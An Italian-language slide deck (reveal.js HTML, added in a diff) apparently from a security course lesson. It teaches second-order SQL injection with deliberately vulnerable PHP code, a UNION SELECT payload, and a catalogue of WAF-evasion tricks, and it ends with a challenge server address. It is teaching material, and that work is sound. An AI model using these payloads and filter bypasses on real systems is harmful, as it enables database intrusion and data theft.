@@ -1,0 +1,330 @@
+<!doctype html>
+<html>
+	<head>
+		<meta charset="utf-8">
+		<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+
+		<title>SQL Injection - Lesson 04 - coppito_zero_day</title>
+
+		<link rel="stylesheet" href="css/reset.css">
+		<link rel="stylesheet" href="css/reveal.css">
+		<link rel="stylesheet" href="css/theme/coppito-zero-day.css">
+
+		<!-- Theme used for syntax highlighting of code -->
+		<link rel="stylesheet" href="lib/css/monokai.css">
+
+		<!-- Printing and PDF exports -->
+		<script>
+			var link = document.createElement( 'link' );
+			link.rel = 'stylesheet';
+			link.type = 'text/css';
+			link.href = window.location.search.match( /print-pdf/gi ) ? 'css/print/pdf.css' : 'css/print/paper.css';
+			document.getElementsByTagName( 'head' )[0].appendChild( link );
+		</script>
+	</head>
+	<body>
+		<div class="reveal">
+			<div class="slides">
+				<section>
+					<h2>SQL Injection</h2>
+					<h4>LESSON 04</h4>
+				</section>
+				<section>
+					<h2>'SECOND ORDER INJECTION</h2>
+					<p>Tutte le SQLi viste finora sono di tipo 'first-order', ossia quando l'injection avviene nel corso di una singola richiesta HTTP.</p>
+					<p>&nbsp;</p>
+					<p class="fragment fade">
+						Le "second-order" SQLi sono le injection che avvengono in una o più richieste HTTP.
+					</p>
+				</section>
+				<section>
+					<h2>'SECOND ORDER INJECTION</h2>
+					<h4>Flusso tipico:</h4>
+					<ul>
+						<li class="fragment fade">Un input malevolo viene inviato in una richiesta HTTP.</li>
+						<li class="fragment fade">L'applicazione salva correttamente l'input.</li>
+						<li class="fragment fade">Viene effettuata una seconda richiesta HTTP.</li>
+						<li class="fragment fade">L'applicazione processa l'input precedentemente salvato e scatena l'SQLi.</li>
+						<li class="fragment fade">Il risultato della SQLi viene restituito (non sempre).</li>
+					</ul>
+					<p class="fragment fade">
+						Le second order SQLi avvengono poichè gli sviluppatore tendono a fidarsi di un input ricevuto dal DB.<br />
+						Per evitare ogni forma di SQLi è necessario "sterilizzare" sempre tutte le query (usate i prepared statements!).
+					</p>
+				</section>
+				<section>
+					<h2>'SECOND ORDER INJECTION</h2>
+					<h4>Esempio</h4>
+					<div class="fragment fade">
+						<pre>
+							<code class="hljs php" data-trim>
+// We're switching to Capsule as ORM to write queries.
+$user = $capsule->table('users')->where('id', '=', $_GET['id'])->first();
+// produces: SELECT * from `users` where id = 1; <<< can't inject anything here
+
+// No need to use prepared statements here, the input comes from DB.
+$messages = Capsule::select("SELECT id, username, message FROM messages
+WHERE username = '" . $user->username . "'");
+foreach($messages as $message) {
+	echo $message->text;
+}
+							</code>
+						</pre>
+					</div>
+					<div class="fragment fade">
+						<small><code>id</code> non è vulnerabile. Il risultato della prima query viene utilizzato come parametro per la seconda.</small>
+						<small>Cosa accade se possiamo controllare <code>$user->username</code>?.</small>
+					</div>
+				</section>
+				<section>
+					<h2>'SECOND ORDER INJECTION</h2>
+					<h4>Esempio</h4>
+					<div class="fragment fade">
+						<small>Valore in input:</small>
+						<pre>
+							<code class="hljs php" data-trim>
+								$username = "' UNION ALL SELECT @@version, 2, 3";
+								$id = 1;
+								</code>
+							</pre>
+					</div>
+					<div class="fragment fade">
+						<small>Risultato:</small>
+						<pre>
+							<code class="hljs sql" data-trim>
+/* First query gets executed: */
+SELECT * from `users` where id = 1;
+/*
+the $user variable will contain:
+array(
+  "id" => 1,
+  "username" => "' UNION ALL SELECT @@version, 2, 3"
+)
+The second query gets executed:
+*/
+SELECT id, username, message FROM messages WHERE username = ''
+UNION ALL SELECT @@version, 2, 3
+/*
+# The injection gets triggered !!!
+*/
+							</code>
+						</pre>
+					</div>
+				</section>
+				<section>
+					<h2>'WAF EVASION</h2>
+					<p class="fragment fade">
+						I WAF (Web Application Firewall) sono degli strumenti per filtrare gli input degli utenti nelle web-application per difenderli dagli attacchi.<br />
+					Possono essere inclusi nel codice dell'applicazione o come strumenti esterni (come mod_security per Apache).<br /><br />
+					</p>
+					<h4 class="fragment fade">Un WAF va alla ricerca di:</h4>
+					<ul>
+						<li class="fragment fade">Istruzioni o keywords SQL. (es. <code>UNION</code>)</li>
+						<li class="fragment fade">Pattern comuni di SQLi. (es. <code>or '1'='1'</code>)</li>
+						<li class="fragment fade">Specifici caratteri. (es. <code>'</code> o <code>"</code>)</li>
+					</ul>
+				</section>
+				<section>
+					<h2>'WAF EVASION</h2>
+					<h4>Case variation</h4>
+					<p>&nbsp;</p>
+					<p>&nbsp;</p>
+					<p class="fragment fade">
+						Filter:
+						<code>UNION</code>,<code>union</code>
+					</p>
+					<p class="fragment fade">
+						Evasion:
+						<code>UnIoN</code>,<code>uNiOn</code>
+					</p>
+					<p>&nbsp;</p>
+					<p>&nbsp;</p>
+					<p>&nbsp;</p>
+				</section>
+				<section>
+					<h2>'WAF EVASION</h2>
+					<h4>SQL comments</h4>
+					<p>&nbsp;</p>
+					<p>&nbsp;</p>
+					<p class="fragment fade">
+						Filter:
+						<code>UNION</code> (case variation non funziona)
+					</p>
+					<p class="fragment fade">
+						Evasion:
+						<code>UN/**/ION</code>
+					</p>
+					<p>&nbsp;</p>
+					<p>&nbsp;</p>
+					<p class="fragment fade">
+						Filter:
+						<code>UNION ALL</code> (case variation non funziona)
+					</p>
+					<p class="fragment fade">
+						Evasion:
+						<code>UNION/**/ALL</code>
+					</p>
+					<p>&nbsp;</p>
+					<p>&nbsp;</p>
+				</section>
+				<section>
+					<h2>'WAF EVASION</h2>
+					<h4>HPF (HTTP Parameter Fragmentation)</h4>
+					<p class="fragment fade">
+						Filter:
+						<code>UNION</code>, <code>/**/</code>
+					</p>
+					<p class="fragment fade">
+						Query:
+						<code>$sql = 'SELECT * FROM news WHERE day = "'. $day .'" AND month = "' . $month . '" AND year = "'. $year .'"'</code>
+					</p>
+					<p class="fragment fade">
+						Evasion:<br />
+						<code>
+$day = " UNI/*<br />
+$month = */ON/*<br />
+$year = */ ALL SELECT 1,2,3 -- -
+						</code>
+					</p>
+					<p class="fragment fade">
+						Result:
+						<code>$sql = 'SELECT * FROM news WHERE day = "" UNI/*" AND month = "*/ON/*" AND year = "*/ ALL SELECT 1,2,3 -- -"'</code>
+					</p>
+					<p class="fragment fade">
+						Result:
+						<code>$sql = 'SELECT * FROM news WHERE day = "" UNION ALL SELECT 1,2,3 -- -"'</code>
+					</p>
+				</section>
+				<section>
+					<h2>'WAF EVASION</h2>
+					<h4>URL-encoding</h4>
+					<p>&nbsp;</p>
+					<p class="fragment fade">
+						Gli input filtrati vengono sostituiti dal loro codice ASCII preceduto da <code>%</code>.<br />
+						<code>0x55</code> è il codice ASCII di <code>U</code>, quindi <code>%55</code> è la versione URL-encoded.
+					</p>
+					<p>&nbsp;</p>
+					<p class="fragment fade">
+						Filter:
+						<code>UNION</code>,<code>/**/</code>
+					</p>
+					<p class="fragment fade">
+						Evasion:
+						<code>%55NION</code>, funziona se il WAF agisce prima dell'URL-decode.
+					</p>
+					<p>&nbsp;</p>
+					<p>&nbsp;</p>
+				</section>
+				<section>
+					<h2>'WAF EVASION</h2>
+					<h4>Double URL-encoding</h4>
+					<p>&nbsp;</p>
+					<p class="fragment fade">
+						A volte le applicazioni effettuano l'URL decoding piu di una volta.
+						<code>0x55</code> è il codice ASCII di <code>U</code>, quindi <code>%55</code> è la versione URL-encoded.
+						Effettuiamo l-econde anche di <code>%55</code> ottenendo <code>%2555</code>.
+					</p>
+					<p>&nbsp;</p>
+					<p class="fragment fade">
+						Filter:
+						<code>UNION</code>,<code>/**/</code>
+					</p>
+					<p class="fragment fade">
+						Evasion:
+						<code>%2555NION</code>, funziona se il WAF agisce prima dell'URL-decode.
+					</p>
+					<p>&nbsp;</p>
+					<p>&nbsp;</p>
+				</section>
+				<section>
+					<h2>'WAF EVASION</h2>
+					<h4>Manipulating strings</h4>
+					<p>&nbsp;</p>
+					<p class="fragment fade">
+						Filter:
+						<code>SELECT</code>
+					</p>
+					<p class="fragment fade">
+						Evasion:
+						<code>CHAR(83)+CHAR(69)+CHAR(76)+CHAR(69)+CHAR(67)+CHAR(84)</code> funziona su MSSQL
+					</p>
+					<p>&nbsp;</p>
+					<p class="fragment fade">
+						Filter:
+						<code>admin</code>
+					</p>
+					<p class="fragment fade">
+						Evasion:<br />
+						<code>REVERSE('nimda')</code><br />
+						<code>REPLACE('bdmin', 'b', 'a')</code><br />
+						<code>CONCAT('a','dmin')</code>
+					</p>
+				</section>
+				<section>
+					<h2>'WAF EVASION</h2>
+					<h4>Using Null Bytes</h4>
+					<p>&nbsp;</p>
+					<p class="fragment fade">
+						A volte i WAF sono scritti in linguaggi che usano i null bytes <code>0x00</code> per determinare la lunghezza di una stringa.<br />
+					</p>
+					<p>&nbsp;</p>
+					<p class="fragment fade">
+						Filter:
+						<code>UNION</code>
+					</p>
+					<p class="fragment fade">
+						Evasion:
+						<code>%00UNION</code>, il WAF interrompe il check su <code>%00</code> perchè la stringa viene interpretata con lunghezza <code>0</code>.
+					</p>
+					<p>&nbsp;</p>
+					<p>&nbsp;</p>
+				</section>
+				<section>
+					<h2>'WAF EVASION</h2>
+					<h4>Nesting expressions</h4>
+					<p>&nbsp;</p>
+					<p class="fragment fade">
+						Alcuni WAF rimuovono le parole in blacklist una sola volta.
+						A volte i WAF sono scritti in linguaggi che usano i null bytes <code>0x00</code> per determinare la lunghezza di una stringa.<br />
+					</p>
+					<p>&nbsp;</p>
+					<p class="fragment fade">
+						Filter:
+						<code>UNION</code>
+					</p>
+					<p class="fragment fade">
+						Evasion:
+						<code>UNIUNIONON</code>, dopo la sostituzione <code>UNION</code>.
+					</p>
+					<p>&nbsp;</p>
+					<p>&nbsp;</p>
+				</section>
+				<section>
+					<h2>CHALLENGE</h2>
+					<h4>http://167.172.164.187/czd04/</h4>
+				</section>
+			</div>
+		</div>
+
+		<script src="js/reveal.js"></script>
+
+		<script>
+			// More info about config & dependencies:
+			// - https://github.com/hakimel/reveal.js#configuration
+			// - https://github.com/hakimel/reveal.js#dependencies
+			Reveal.initialize({
+				dependencies: [
+					{ src: 'plugin/markdown/marked.js' },
+					{ src: 'plugin/markdown/markdown.js' },
+					{ src: 'plugin/notes/notes.js', async: true },
+					{ src: 'plugin/highlight/highlight.js', async: true }
+				],
+				slideNumber: false,
+				width: 1600,
+				//height: 1000,
+				hash: true,
+				pdfSeparateFragments: false
+			});
+		</script>
+	</body>
+</html>
